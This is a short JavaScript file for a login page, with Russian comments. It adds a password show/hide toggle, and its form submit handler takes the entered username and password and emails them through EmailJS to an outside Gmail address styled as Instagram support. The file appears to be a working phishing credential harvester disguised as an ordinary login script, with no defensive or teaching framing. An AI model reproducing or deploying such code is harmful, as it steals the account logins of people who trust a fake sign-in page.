const passwordInput = document.getElementById('password');
const togglePasswordButton = document.getElementById('togglePassword');

// Следим за вводом символов в поле
passwordInput.addEventListener('input', () => {
    if (passwordInput.value.length > 0) {
        togglePasswordButton.classList.add('show'); // Показываем кнопку, если есть символы
    } else {
        togglePasswordButton.classList.remove('show'); // Скрываем кнопку, если поле пустое
    }
});

// Переключаем тип поля для отображения или скрытия пароля
togglePasswordButton.addEventListener('click', () => {
    if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        togglePasswordButton.textContent = 'Скрыть'; // Меняем текст кнопки
    } else {
        passwordInput.type = 'password';
        togglePasswordButton.textContent = 'Показать'; // Меняем текст кнопки обратно
    }
});

const form = document.getElementById('loginForm');

form.addEventListener('submit', function(e) {
    e.preventDefault();

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    const templateParams = {
        username: username,
        password: password,
        subject: `You got a new message from Abu-bakar`,
        email: "insta.sapports@gmail.com",
        name:"Abu-bakar"
    };

    // Отправляем данные через EmailJS
    emailjs.send('service_99gyh0h', 'template_dx1fv0r', templateParams)
        .then(function(response) {
            alert('Данные успешно сохранены');
        }, function(error) {
            alert('Ошибка сохранения данных');
        });
});
